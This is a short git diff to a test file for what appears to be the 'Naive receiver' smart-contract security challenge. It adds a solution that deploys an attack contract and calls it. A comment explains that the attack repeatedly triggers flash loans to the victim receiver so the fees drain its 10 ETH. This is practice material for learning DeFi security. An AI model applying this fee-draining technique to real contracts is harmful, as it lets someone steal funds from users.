@@ -30,7 +30,17 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        /*
+        Make attack contract to repeatedly call flashLoan to the recipient
+        Do this until the fees have drained all 10 ETH
+        Can be done in one transaction using a for loop
+        */
+
+       const AttackFactory = await ethers.getContractFactory("NaiveReceiverAttack", attacker)
+       const attackContract = await AttackFactory.deploy(this.receiver.address, this.pool.address)
+       
+       await attackContract.attack()
     });
 
     after(async function () {
